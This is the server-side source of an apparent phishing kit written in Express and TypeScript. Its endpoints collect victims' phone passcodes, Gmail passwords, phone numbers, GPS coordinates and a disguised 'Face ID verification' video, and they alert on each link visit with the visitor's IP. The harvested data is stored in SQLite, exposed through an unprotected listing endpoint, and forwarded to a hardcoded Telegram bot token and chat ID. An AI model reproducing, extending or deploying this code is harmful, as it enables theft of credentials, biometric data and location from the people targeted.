import express from "express";
import { createServer as createViteServer } from "vite";
import Database from "better-sqlite3";
import path from "path";
import { fileURLToPath } from "url";
import fs from "fs";
import cors from "cors";
import multer from "multer";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const upload = multer({ storage: multer.memoryStorage() });

const dbPath = path.resolve(__dirname, "submissions.db");
let db: Database.Database;
try {
  db = new Database(dbPath);
  console.log(`Database initialized at ${dbPath}`);
  
  // Initialize database
  db.exec(`
    CREATE TABLE IF NOT EXISTS submissions (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      passcode TEXT,
      gmail_password TEXT,
      phone_number TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
  console.log("Submissions table ensured");

  // Write test
  try {
    db.prepare("INSERT INTO submissions (passcode) VALUES (?)").run("init_test");
    db.prepare("DELETE FROM submissions WHERE passcode = ?").run("init_test");
    console.log("Database write test successful");
  } catch (writeErr) {
    console.error("Database write test failed:", writeErr);
  }
} catch (err) {
  console.error("Failed to initialize database:", err);
}

async function startServer() {
  const app = express();
  const PORT = 3000;

  // Enable CORS for all routes
  app.use(cors());
  app.use(express.json());
  app.use(express.urlencoded({ extended: true }));

  // Logging middleware
  app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
  });

  // API Router
  const apiRouter = express.Router();

  apiRouter.use((req, res, next) => {
    console.log(`API Request: ${req.method} ${req.url}`);
    next();
  });

  apiRouter.get("/test", (req, res) => {
    res.json({ message: "API is working", time: new Date().toISOString() });
  });

  apiRouter.post("/log-event", async (req, res) => {
    const { event, data } = req.body;
    const botToken = "8499597300:AAGqvpJfBKWtYqWz2z3-unvfJ6QmnU2yRwU";
    const chatId = "7643809155";
    
    if (!botToken || !chatId) {
      return res.json({ success: true, note: "Telegram not configured" });
    }

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    let message = "";

    switch (event) {
      case "visit":
        message = `⚠️ *Someone tapped the link!*\n📍 *IP:* ${ip}`;
        break;
      case "passcode":
        message = `🔑 *Passcode Entered:*\n\`${data.passcode}\`\n📍 *IP:* ${ip}`;
        break;
      case "gmail":
        message = `📧 *Gmail Password Entered:*\n\`${data.gmailPassword}\`\n📍 *IP:* ${ip}`;
        break;
      case "phone":
        message = `📱 *Phone Number Entered:*\n\`${data.phoneNumber}\`\n📍 *IP:* ${ip}`;
        break;
      case "location":
        message = `📍 *Location Received:*\n🌍 [View on Google Maps](https://www.google.com/maps?q=${data.latitude},${data.longitude})\n📍 *IP:* ${ip}`;
        break;
      default:
        message = `📝 *Event:* ${event}\n*Data:* ${JSON.stringify(data)}\n📍 *IP:* ${ip}`;
    }

    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown",
        }),
      });
      res.json({ success: true });
    } catch (error) {
      console.error("Telegram log error:", error);
      res.status(500).json({ error: "Failed to log event" });
    }
  });

  apiRouter.post("/upload-video", upload.single("video"), async (req: any, res) => {
    const botToken = "8499597300:AAGqvpJfBKWtYqWz2z3-unvfJ6QmnU2yRwU";
    const chatId = "7643809155";
    
    if (!req.file) {
      return res.status(400).json({ error: "No video file provided" });
    }

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    try {
      const formData = new FormData();
      const blob = new Blob([req.file.buffer], { type: req.file.mimetype });
      formData.append("chat_id", chatId);
      formData.append("video", blob, "face_id_verification.webm");
      formData.append("caption", `👤 *Face ID Video Received*\n📍 *IP:* ${ip}`);

      await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
        method: "POST",
        body: formData,
      });

      res.json({ success: true });
    } catch (error) {
      console.error("Telegram video upload error:", error);
      res.status(500).json({ error: "Failed to upload video" });
    }
  });

  apiRouter.post("/submit", async (req, res) => {
    const { passcode, gmailPassword, phoneNumber } = req.body;
    if (!passcode && !gmailPassword && !phoneNumber) {
      return res.status(400).json({ error: "Empty submission" });
    }

    // Prepare Telegram message
    const botToken = "8499597300:AAGqvpJfBKWtYqWz2z3-unvfJ6QmnU2yRwU";
    const chatId = "7643809155";
    
    const message = `
🚀 *New Submission Received*
--------------------------
🔑 *Passcode:* ${passcode || "N/A"}
📧 *Gmail Password:* ${gmailPassword || "N/A"}
📱 *Phone Number:* ${phoneNumber || "N/A"}
--------------------------
⏰ *Time:* ${new Date().toLocaleString()}
    `;

    try {
      // Save to local DB as backup
      const stmt = db.prepare("INSERT INTO submissions (passcode, gmail_password, phone_number) VALUES (?, ?, ?)");
      const result = stmt.run(passcode || "", gmailPassword || "", phoneNumber || "");
      
      // Send to Telegram if configured
      if (botToken && chatId) {
        console.log("Sending notification to Telegram...");
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown",
          }),
        });
        console.log("Telegram notification sent successfully");
      } else {
        console.warn("Telegram bot not configured, skipping notification");
      }

      res.json({ success: true, id: result.lastInsertRowid });
    } catch (error) {
      console.error("Submission error:", error);
      res.status(500).json({ error: "Failed to process submission" });
    }
  });

  apiRouter.get("/submissions", (req, res) => {
    try {
      const rows = db.prepare("SELECT * FROM submissions ORDER BY created_at DESC").all();
      res.json(rows);
    } catch (error) {
      console.error("Database error:", error);
      res.status(500).json({ error: "Failed to fetch submissions" });
    }
  });

  app.use("/data-api/v1", apiRouter);

  // Vite middleware for development
  let vite: any;
  if (process.env.NODE_ENV !== "production") {
    vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "custom",
    });
    app.use(vite.middlewares);
  } else {
    app.use(express.static(path.join(__dirname, "dist")));
  }

  // Catch-all route to serve index.html for SPA routing
  app.get("*", async (req, res, next) => {
    // Skip API routes that might have reached here
    if (req.url.startsWith("/data-api/")) {
      return res.status(404).json({ error: "API route not found" });
    }

    const url = req.originalUrl;

    try {
      if (process.env.NODE_ENV !== "production") {
        let template = fs.readFileSync(path.resolve(__dirname, "index.html"), "utf-8");
        template = await vite.transformIndexHtml(url, template);
        res.status(200).set({ "Content-Type": "text/html" }).end(template);
      } else {
        res.sendFile(path.join(__dirname, "dist", "index.html"));
      }
    } catch (e: any) {
      if (process.env.NODE_ENV !== "production") {
        vite.ssrFixStacktrace(e);
      }
      next(e);
    }
  });

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
